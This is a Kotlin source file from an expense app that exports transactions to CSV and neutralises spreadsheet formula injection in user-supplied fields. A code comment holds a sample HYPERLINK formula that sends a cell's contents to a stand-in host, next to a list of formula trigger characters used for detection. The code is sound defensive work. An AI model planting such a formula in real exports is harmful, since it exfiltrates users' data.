package com.expenser.app.data.backup

import com.expenser.app.data.db.entity.TransactionEntity
import kotlin.math.abs

/** Renders transactions as spreadsheet-friendly CSV (export only, not restored). */
object CsvExport {

    private const val HEADER = "Date,Name,Amount,Category,Type,Note"

    /**
     * Characters that make Excel, Sheets and LibreOffice read a cell as a formula rather
     * than text. A name like `=HYPERLINK("http://x?d="&A1,"click")` would otherwise run
     * when the export is opened - the file is data this app wrote, but the *contents* are
     * not: a transaction name can arrive from an imported backup someone else supplied.
     */
    private val FORMULA_TRIGGERS = setOf('=', '+', '-', '@', '\t', '\r')

    fun transactionsToCsv(data: BackupData): String {
        val categoryName = data.categories.associate { it.id to it.name }
        return buildString {
            append(HEADER).append('\n')
            data.transactions
                .sortedWith(compareByDescending<TransactionEntity> { it.date }.thenBy { it.name.lowercase() })
                .forEach { t ->
                    val row = listOf(
                        // Generated values: an ISO date, a fixed-point decimal and an enum
                        // name. Their shape is ours, so they pass through as literals -
                        // notably the amount, which starts with '-' when negative and has
                        // to stay a number the spreadsheet can total.
                        field(t.date),
                        userField(t.name),
                        minorToDecimal(t.amountMinor),
                        userField(categoryName[t.categoryId] ?: ""),
                        field(t.type.name),
                        userField(t.note ?: ""),
                    )
                    append(row.joinToString(",")).append('\n')
                }
        }
    }

    /** 1250 -> "12.50", -5 -> "-0.05". Plain decimal, no locale grouping. */
    fun minorToDecimal(minor: Long): String {
        val sign = if (minor < 0) "-" else ""
        val absolute = abs(minor)
        return "$sign${absolute / 100}.${(absolute % 100).toString().padStart(2, '0')}"
    }

    /** CSV-quote a value whose content this app controls. */
    private fun field(value: String): String =
        if (value.any { it == ',' || it == '"' || it == '\n' || it == '\r' }) {
            "\"${value.replace("\"", "\"\"")}\""
        } else {
            value
        }

    /**
     * CSV-quote a user-supplied value, and disarm it if it opens with a [FORMULA_TRIGGERS]
     * character: prefix an apostrophe and always quote, which is what tells a spreadsheet
     * to treat the cell as text. Some readers show that apostrophe, which is the visible
     * cost of the cell not executing. Safe to alter the text here because CSV is
     * export-only - restores go through the JSON backup, which is left byte-exact.
     */
    private fun userField(value: String): String =
        if (value.firstOrNull() in FORMULA_TRIGGERS) {
            "\"'${value.replace("\"", "\"\"")}\""
        } else {
            field(value)
        }
}
